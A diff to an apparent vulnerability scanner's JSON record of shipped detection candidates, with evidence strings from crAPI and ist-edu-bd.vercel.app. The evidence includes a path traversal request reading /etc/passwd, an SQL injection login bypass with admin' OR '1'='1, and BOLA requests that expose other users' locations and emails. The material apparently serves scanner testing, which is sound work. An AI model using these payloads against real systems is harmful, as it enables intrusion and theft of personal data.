@@ -2,6 +2,24 @@
   "candidates": [
     {
       "source": "discovery:crapi.apisec.ai",
+      "slug": "crapi-vehicle-route-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: signup JWT + GET /community/api/v2/community/posts/recent leaks vehicleid UUID; GET /identity/api/v2/vehicle/{uuid}/location returns latitude/longitude/fullName for another user; crapi.apisec.ai/identity/api/v2/vehicle/vehicles findings 3→6; benchmark juice-shop-staging 14 findings 6/6 maintained"
+    },
+    {
+      "source": "discovery:ist-edu-bd.vercel.app",
+      "slug": "ist-edu-notices-lfi-route-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: GET /api/notices?file=../../../etc/passwd returns root:x:0:0:root on route scan; ist-edu-bd.vercel.app/api/notices findings 4→5; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:ist-edu-bd.vercel.app",
+      "slug": "ist-edu-portal-sqli-route-live-oracle",
+      "status": "shipped",
+      "validation": "SOURCE: discovery:url EVIDENCE: POST /api/portal username=admin' OR '1'='1 returns Authentication Bypass Successful HTML; ist-edu-bd.vercel.app/api/portal findings 4→5; benchmark 6/6 maintained"
+    },
+    {
+      "source": "discovery:crapi.apisec.ai",
       "slug": "crapi-mechanic-report-route-live-oracle",
       "status": "shipped",
       "validation": "SOURCE: discovery:url EVIDENCE: GET /workshop/api/mechanic/mechanic_report?report_id=1 returns adam007@example.com vehicle PII; report_id=2 returns pogba006@example.com — sequential BOLA; crapi.apisec.ai/.../mechanic_report findings 3→5; benchmark juice-shop.herokuapp.com 17 findings 6/6 maintained"
@@ -14438,6 +14456,26 @@
       "source": "discovery:juice-shop",
       "slug": "jwt-alg-none-accepted",
       "shipped_at": "2026-07-27T19:15:00.000Z"
+    },
+    {
+      "source": "discovery:crapi.apisec.ai",
+      "slug": "crapi-vehicle-bola-live-oracle",
+      "shipped_at": "2026-07-27T20:10:00.000Z"
+    },
+    {
+      "source": "discovery:crapi.apisec.ai",
+      "slug": "crapi-vehicle-route-live-oracle",
+      "shipped_at": "2026-07-27T20:10:00.000Z"
+    },
+    {
+      "source": "discovery:ist-edu-bd.vercel.app",
+      "slug": "ist-edu-notices-lfi-route-live-oracle",
+      "shipped_at": "2026-07-27T20:10:00.000Z"
+    },
+    {
+      "source": "discovery:ist-edu-bd.vercel.app",
+      "slug": "ist-edu-portal-sqli-route-live-oracle",
+      "shipped_at": "2026-07-27T20:10:00.000Z"
     }
   ]
 }
